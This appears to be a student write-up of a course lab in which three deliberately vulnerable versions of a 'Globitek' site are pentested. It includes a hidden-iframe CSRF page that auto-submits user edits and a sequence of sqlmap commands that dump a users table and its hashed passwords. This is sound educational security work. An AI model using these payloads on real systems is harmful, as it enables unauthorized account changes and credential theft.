# Project 8 - Pentesting Live Targets

Time spent: **25** hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:
* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each version of the site has been given two of the six vulnerabilities. (In other words, all six of the exploits should be assignable to one of the sites.)

## Blue

Vulnerability #1: SQLi - The id parameter is unsanitized and escapable on the salepeople page.

GIF Walkthrough: <img src='http://i.imgur.com/qaOIRtL.gif' />

Vulnerability #2: Session Hijacking/Fixation - A new session ID isn't regenerated when loging back in.

GIF Walkthrough: <img src='http://i.imgur.com/2tWbuTi.gif' />

## Green

Vulnerability #1: Username Enumeration - Error message switches between bold and regular depending if username exists or not.

GIF Walkthrough: <img src='http://i.imgur.com/UYoccrU.gif' />

Vulnerability #2: Stored XSS - The Name and Feedback fields on the feedback page are unsanitized. Guest can send malicious messages with embedded JS that will trigger once opened.

GIF Walkthrough: <img src='http://i.imgur.com/o1zsKGH.gif' />


## Red

Vulnerability #1: IDOR - Hidden salespeople ids are accessible

GIF Walkthrough: <img src='http://i.imgur.com/lnQoU8t.gif' />

Vulnerability #2: CSRF - CSRF tokens are not used in the edit pages

GIF Walkthrough: <img src='http://i.imgur.com/qoO6YKA.gif' />


## Notes

Describe any challenges encountered while doing the work

CSRF Test Form:

```
<!DOCTYPE html>
<html>
<body>

<h1> Don't Worry! This site is doing absolutely nothing suspicious! >:) </h1>

<!-- iframe holds the redirected page after submittion and is hidden from the unsuspecting victim -->
<iframe width="0" height="0" border="0" name="dummyframe" id="dummyframe"></iframe>

<form name="csrfForm" action="https://104.154.233.91/red/public/staff/users/edit.php?id=4" target="dummyframe" method="POST">
 <input type="hidden" name="first_name" value="CSRF" />
 <input type="hidden" name="last_name" value="Successful" />
</form>
<script>document.csrfForm.submit(); </script>

</body>
</html>
```
Bonus 1 Task:

The admin login credentials were left out accidently at first and it wasn't possible to login. Before the neccessary admin credentials were provided, the database was exposed using Sqlmap to obtained the admin credentials from the users table. The hashed passwords were obtained but the passwords were salted. With no information on what the salt values could be, decrypting the hashed passwords was almost impossible. Although this prodecure didn't result in successfully loging into the admin page, learning how to use Sqlmap in such a circumstance was a very insightful experience. The default Sqlmap version was also outdated and didn't work; had to install updated version from the official github link.

Sqlmap Installation Command:

```
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
``` 

*Note: Must navigate to the "sqlmap-dev" directory before executing the following command.

Sqlmap Command - Get databases from host 104.197.43.145: 

```
python2 sqlmap.py --url 'https://104.197.43.145/blue/public/salesperson.php?id=1' --cookie='security=low; PHPSESSID=5d1dmfg3ak225m3kmam8qkkat2' --dbs
```

Sqlmap Command - Get tables from database "globitek_blue":

```
python2 sqlmap.py --url 'https://104.197.43.145/blue/public/salesperson.php?id=1' --tables -D globitek_blue

```

Sqlmap Command - Get columns from table "users":

```
python2 sqlmap.py --url 'https://104.197.43.145/blue/public/salesperson.php?id=1' --columns -D globitek_blue -T users
```

Sqlmap Command - Dump table "users":

```
python2 sqlmap.py --url 'https://104.197.43.145/blue/public/salesperson.php?id=1' --dump -D globitek_blue -T users
```

Sqlmap Command - Dump column "hashed_password" from table "users":

```
python2 sqlmap.py --url 'https://104.197.43.145/blue/public/salesperson.php?id=1' --dump -D globitek_blue -T users -C hashed_password
```

GIF Walkthrough: <img src='http://i.imgur.com/6NCLBA1.gif' />